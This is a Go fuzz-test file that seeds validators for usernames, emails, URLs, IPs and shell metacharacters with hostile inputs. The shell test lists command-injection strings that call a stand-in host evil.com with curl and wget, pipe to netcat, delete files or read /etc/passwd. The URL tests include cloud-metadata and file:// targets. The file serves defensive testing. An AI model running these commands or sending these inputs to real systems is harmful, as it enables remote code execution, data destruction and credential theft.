package interaction

import (
	"strings"
	"testing"
)

func FuzzNormalizeYesNoInput(f *testing.F) {
	// Seed with a few common answers
	f.Add("yes")
	f.Add("no")
	f.Add("Y")
	f.Add("n")
	f.Add("  yEs ")
	f.Add("  ")
	f.Add("not-a-valid-answer")

	f.Fuzz(func(t *testing.T, input string) {
		_, _ = NormalizeYesNoInput(input)
		// You can add more checks if you want,
		// but fuzzing will mainly reveal panics or logic bugs.
	})
}

func FuzzValidateNonEmpty(f *testing.F) {
	f.Add("")
	f.Add("   ")
	f.Add("hello")
	f.Add("\n\t")
	f.Fuzz(func(t *testing.T, s string) {
		_ = ValidateNonEmpty(s)
	})
}

func FuzzValidateUsername(f *testing.F) {
	f.Add("")
	f.Add("root")
	f.Add("user_1")
	f.Add("Auser")
	f.Add("bad-user-!")
	f.Add("verylongusername_morethan32characterslong")
	f.Add("_underscore")
	f.Fuzz(func(t *testing.T, s string) {
		_ = ValidateUsername(s)
	})
}

func FuzzValidateEmail(f *testing.F) {
	f.Add("")
	f.Add("notanemail")
	f.Add("foo@bar.com")
	f.Add("foo@bar")
	f.Add("foo@bar.com.au")
	f.Add("foo@bar..com")
	f.Fuzz(func(t *testing.T, s string) {
		_ = ValidateEmail(s)
	})
}

func FuzzValidateURL(f *testing.F) {
	f.Add("")
	f.Add("http://example.com")
	f.Add("https://example.com/path")
	f.Add("ftp://foo")
	f.Add("not a url")
	f.Fuzz(func(t *testing.T, s string) {
		_ = ValidateURL(s)
	})
}

func FuzzValidateIP(f *testing.F) {
	f.Add("")
	f.Add("127.0.0.1")
	f.Add("256.256.256.256")
	f.Add("::1")
	f.Add("abcd")
	f.Fuzz(func(t *testing.T, s string) {
		_ = ValidateIP(s)
	})
}

func FuzzValidateNoShellMeta(f *testing.F) {
	f.Add("hello")
	f.Add("rm -rf /")
	f.Add("safe_input")
	f.Add("`cat /etc/passwd`")
	f.Add("user$name")
	f.Add("nothing_special")

	// Enhanced security test vectors
	f.Add("$(id)")                 // Command substitution
	f.Add("${PATH}")               // Variable expansion
	f.Add("test|nc -l 4444")       // Pipe to netcat
	f.Add("test;curl evil.com")    // Command chaining
	f.Add("test&&rm /etc/passwd")  // Conditional execution
	f.Add("test||echo pwned")      // Alternative execution
	f.Add("$(curl -s evil.com)")   // Remote code execution
	f.Add("test<script>alert(1)")  // XSS-style injection
	f.Add("test>output.txt")       // Output redirection
	f.Add("test 2>&1")             // Error redirection
	f.Add("test\nrm -rf /")        // Newline injection
	f.Add("test\x00malicious")     // Null byte injection
	f.Add("`wget evil.com/shell`") // Backtick execution
	f.Add("test & background_cmd") // Background execution
	f.Add("test (subshell)")       // Subshell execution
	f.Add("test {expansion}")      // Brace expansion

	f.Fuzz(func(t *testing.T, s string) {
		result := ValidateNoShellMeta(s)

		// Enhanced validation: if input contains dangerous patterns,
		// the validator should reject it
		if containsShellMetacharacters(s) && result == nil {
			t.Errorf("ValidateNoShellMeta should have rejected dangerous input: %s", s)
		}
	})
}

// Helper function to detect shell metacharacters more comprehensively
func containsShellMetacharacters(input string) bool {
	// The current ValidateNoShellMeta checks for: `$&|;<>(){}
	// But there are more dangerous patterns
	dangerousPatterns := []string{
		"`", "$", "&", "|", ";", "<", ">", "(", ")", "{", "}",
		"\n", "\r", "\t", "\x00", // Control characters
		"$(", "${", "||", "&&", ">>", "<<", // Compound operators
	}

	for _, pattern := range dangerousPatterns {
		if strings.Contains(input, pattern) {
			return true
		}
	}
	return false
}

// FuzzValidateEmailSecurity tests email validation with security-focused inputs
func FuzzValidateEmailSecurity(f *testing.F) {
	// Standard email tests
	f.Add("user@domain.com")
	f.Add("test@example.org")

	// Security-focused email tests
	f.Add("admin@localhost")                           // Local domain
	f.Add("root@127.0.0.1")                            // IP address
	f.Add("test@[127.0.0.1]")                          // Bracketed IP
	f.Add("user+tag@domain.com")                       // Plus addressing
	f.Add("user@sub.domain.co.uk")                     // Multiple subdomains
	f.Add("\"test\"@domain.com")                       // Quoted local part
	f.Add("user@domain")                               // Missing TLD
	f.Add("@domain.com")                               // Missing local part
	f.Add("user@@domain.com")                          // Double @
	f.Add("user@")                                     // Missing domain
	f.Add("user@.com")                                 // Leading dot in domain
	f.Add("user@domain.")                              // Trailing dot
	f.Add("user@domain..com")                          // Double dot in domain
	f.Add("user@-domain.com")                          // Leading dash in domain
	f.Add("user@domain-.com")                          // Trailing dash in domain
	f.Add("user\x00@domain.com")                       // Null byte injection
	f.Add("user\n@domain.com")                         // Newline injection
	f.Add("user@domain\x00.com")                       // Null in domain
	f.Add(strings.Repeat("a", 64) + "@domain.com")     // Long local part
	f.Add("user@" + strings.Repeat("a", 253) + ".com") // Long domain

	f.Fuzz(func(t *testing.T, email string) {
		defer func() {
			if r := recover(); r != nil {
				t.Errorf("ValidateEmail panicked on input '%s': %v", email, r)
			}
		}()

		_ = ValidateEmail(email)
	})
}

// FuzzValidateUsernameSecurity tests username validation with security inputs
func FuzzValidateUsernameSecurity(f *testing.F) {
	f.Add("user")
	f.Add("test123")
	f.Add("_private")

	// Security-focused username tests
	f.Add("root")                  // System user
	f.Add("admin")                 // Admin user
	f.Add("administrator")         // Windows admin
	f.Add("guest")                 // Guest account
	f.Add("nobody")                // Nobody user
	f.Add("daemon")                // Daemon user
	f.Add("bin")                   // System bin user
	f.Add("sys")                   // System user
	f.Add("mail")                  // Mail user
	f.Add("www-data")              // Web server user
	f.Add("User")                  // Uppercase (should fail)
	f.Add("user name")             // Space (should fail)
	f.Add("user.name")             // Dot (should fail)
	f.Add("user@name")             // @ symbol (should fail)
	f.Add("user/name")             // Slash (should fail)
	f.Add("user\\name")            // Backslash (should fail)
	f.Add("user:name")             // Colon (should fail)
	f.Add("user*name")             // Asterisk (should fail)
	f.Add("user?name")             // Question mark (should fail)
	f.Add("user|name")             // Pipe (should fail)
	f.Add("user<name")             // Less than (should fail)
	f.Add("user>name")             // Greater than (should fail)
	f.Add("user\"name")            // Quote (should fail)
	f.Add("user'name")             // Apostrophe (should fail)
	f.Add("user\x00name")          // Null byte (should fail)
	f.Add("user\nname")            // Newline (should fail)
	f.Add(strings.Repeat("a", 33)) // Too long (should fail)
	f.Add("")                      // Empty (should fail)
	f.Add("123user")               // Starting with number (should fail)
	f.Add("-user")                 // Starting with dash (should fail)
	f.Add(".user")                 // Starting with dot (should fail)

	f.Fuzz(func(t *testing.T, username string) {
		defer func() {
			if r := recover(); r != nil {
				t.Errorf("ValidateUsername panicked on input '%s': %v", username, r)
			}
		}()

		_ = ValidateUsername(username)
	})
}

// FuzzValidateURLSecurity tests URL validation with security-focused inputs
func FuzzValidateURLSecurity(f *testing.F) {
	f.Add("https://example.com")
	f.Add("http://test.org/path")

	// Security-focused URL tests
	f.Add("file:///etc/passwd")                           // Local file access
	f.Add("ftp://anonymous@ftp.com")                      // FTP with credentials
	f.Add("ldap://ldap.example.com")                      // LDAP protocol
	f.Add("gopher://gopher.com")                          // Gopher protocol
	f.Add("javascript:alert(1)")                          // JavaScript URL
	f.Add("data:text/html,<script>")                      // Data URL with script
	f.Add("http://localhost:8080")                        // Localhost
	f.Add("http://127.0.0.1:22")                          // Localhost IP with SSH port
	f.Add("http://0.0.0.0")                               // All interfaces
	f.Add("http://::1")                                   // IPv6 localhost
	f.Add("http://[::1]:8080")                            // IPv6 with port
	f.Add("http://192.168.1.1")                           // Private IP
	f.Add("http://10.0.0.1")                              // Private IP
	f.Add("http://172.16.0.1")                            // Private IP
	f.Add("http://metadata.google.internal")              // Cloud metadata
	f.Add("http://169.254.169.254")                       // AWS metadata IP
	f.Add("http://user:pass@evil.com")                    // Credentials in URL
	f.Add("http://evil.com@good.com")                     // Host confusion
	f.Add("http://good.com.evil.com")                     // Subdomain takeover style
	f.Add("http://example.com/../../../etc/passwd")       // Path traversal
	f.Add("http://example.com/\x00")                      // Null byte
	f.Add("http://example.com/\n")                        // Newline
	f.Add("http://" + strings.Repeat("a", 1000) + ".com") // Long hostname

	f.Fuzz(func(t *testing.T, urlStr string) {
		defer func() {
			if r := recover(); r != nil {
				t.Errorf("ValidateURL panicked on input '%s': %v", urlStr, r)
			}
		}()

		_ = ValidateURL(urlStr)
	})
}

// FuzzValidateIPSecurity tests IP validation with security-focused inputs
func FuzzValidateIPSecurity(f *testing.F) {
	f.Add("192.168.1.1")
	f.Add("10.0.0.1")
	f.Add("::1")
	f.Add("2001:db8::1")

	// Security-focused IP tests
	f.Add("0.0.0.0")          // All interfaces
	f.Add("127.0.0.1")        // Localhost
	f.Add("::1")              // IPv6 localhost
	f.Add("169.254.169.254")  // AWS metadata IP
	f.Add("224.0.0.1")        // Multicast
	f.Add("255.255.255.255")  // Broadcast
	f.Add("192.168.0.1")      // Private
	f.Add("10.255.255.255")   // Private
	f.Add("172.31.255.255")   // Private
	f.Add("fc00::1")          // IPv6 private
	f.Add("fe80::1")          // IPv6 link-local
	f.Add("ff00::1")          // IPv6 multicast
	f.Add("256.256.256.256")  // Invalid IPv4
	f.Add("192.168.1")        // Incomplete IPv4
	f.Add("192.168.1.1.1")    // Too many octets
	f.Add("192.168.01.1")     // Leading zero
	f.Add("192.168.-1.1")     // Negative
	f.Add("192.168.1.1\x00")  // Null byte
	f.Add("192.168.1.1\n")    // Newline
	f.Add("192.168.1.1/24")   // CIDR notation
	f.Add("192.168.1.1:8080") // With port
	f.Add("[::1]:8080")       // IPv6 with port brackets

	f.Fuzz(func(t *testing.T, ip string) {
		defer func() {
			if r := recover(); r != nil {
				t.Errorf("ValidateIP panicked on input '%s': %v", ip, r)
			}
		}()

		ValidateIP(ip)
	})
}
